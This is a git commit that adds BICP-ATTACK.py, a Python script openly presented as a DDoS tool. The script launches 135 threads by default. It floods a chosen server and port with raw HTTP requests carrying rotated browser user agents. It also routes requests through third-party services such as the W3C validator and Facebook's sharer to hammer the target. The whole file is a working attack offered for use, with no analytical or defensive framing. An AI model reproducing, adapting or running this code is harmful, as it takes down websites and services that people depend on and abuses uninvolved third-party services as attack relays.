e47b54dca63dafe8e5d1f185624a01ce49b4a535
MD SAMIUL ISLAM <96685329+Samiul6@users.noreply.github.com>
2024-01-31 18:48:28 +0600

    Add files via upload

---
+++ BICP-ATTACK.py
@@ -0,0 +1,156 @@
+#MD SAMIUL ISLAM
+#OWNER
+from queue import Queue
+from optparse import OptionParser
+import time,sys,socket,threading,logging,urllib.request,random
+def user_agent():
+	global uagent
+	uagent=[]
+	uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36")
+	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/7.0.185.1002 Safari/537.36")
+	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27")
+	uagent.append("Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0")
+	uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36")
+	uagent.append("Mozilla/5.0 (Windows NT 11.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5653.214 Safari/537.36")
+	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0")
+	uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0")
+	return(uagent)
+
+
+def my_bots():
+	global bots
+	bots=[]
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	return(bots)
+
+
+def bot_hammering(url):
+	try:
+		while True:
+			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
+			print("\033[94mAttacking Bicp..\033[0m")
+			time.sleep(.1)
+	except:
+		time.sleep(.1)
+
+
+def down_it(item):
+	try:
+		while True:
+			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((host,int(port)))
+			if s.sendto( packet, (host, int(port)) ):
+				s.shutdown(1)
+				print ("\033[97m",time.ctime(time.time()),"\033[0m\033[92mAttack Sent Website..\033[0m")
+			else:
+				s.shutdown(1)
+				print("\033[91DOWN!\033[0m")
+			time.sleep(.1)
+	except socket.error as e:
+		print("\033[91mSERVER DOWN!💀\033[0m")
+		#print("\033[91m",e,"\033[0m")
+		time.sleep(.1)
+
+
+def dos():
+	while True:
+		item = q.get()
+		down_it(item)
+		q.task_done()
+
+
+def dos2():
+	while True:
+		item=w.get()
+		bot_hammering(random.choice(bots)+"http://"+host)
+		w.task_done()
+
+
+def usage():
+	print ('''\033[97 BICP DDOS ATTACK
+	 USE :- python3 BICP-ATTACK.py [-s] [-p] [-t]
+	-h : Help
+	-s : Server ip
+	-p : Port  443
+	-t :  Default 135 \033[0m''')
+	sys.exit()
+
+
+def get_parameters():
+	global host
+	global port
+	global thr
+	global item
+	optp = OptionParser(add_help_option=False,epilog="<BICP>")
+	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
+	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
+	optp.add_option("-p","--port",type="int",dest="port",help="-p 443 default 443")
+	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
+	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
+	opts, args = optp.parse_args()
+	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
+	if opts.help:
+		usage()
+	if opts.host is not None:
+		host = opts.host
+	else:
+		usage()
+	if opts.port is None:
+		port = 443
+	else:
+		port = opts.port
+	if opts.turbo is None:
+		thr = 135
+	else:
+		thr = opts.turbo
+
+
+# reading headers
+global data
+headers = open("headers.txt", "r")
+data = headers.read()
+headers.close()
+#task queue are q,w
+q = Queue()
+w = Queue()
+
+
+if __name__ == '__main__':
+	if len(sys.argv) < 2:
+		usage()
+	get_parameters()
+	print("\033[97m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
+	print("\033[97mWAIT...\033[0m")
+	user_agent()
+	my_bots()
+	time.sleep(5)
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host,int(port)))
+		s.settimeout(1)
+	except socket.error as e:
+		print("\033[91mCHEK SERVER IP & PORT\033[0m")
+		usage()
+	while True:
+		for i in range(int(thr)):
+			t = threading.Thread(target=dos)
+			t.daemon = True  # if thread is exist, it dies
+			t.start()
+			t2 = threading.Thread(target=dos2)
+			t2.daemon = True  # if thread is exist, it dies
+			t2.start()
+		start = time.time()
+		#tasking
+		item = 0
+		while True:
+			if (item>1800): # for no memory crash
+				item=0
+				time.sleep(.1)
+			item = item + 1
+			q.put(item)
+			w.put(item)
+		q.join()
+		w.join()
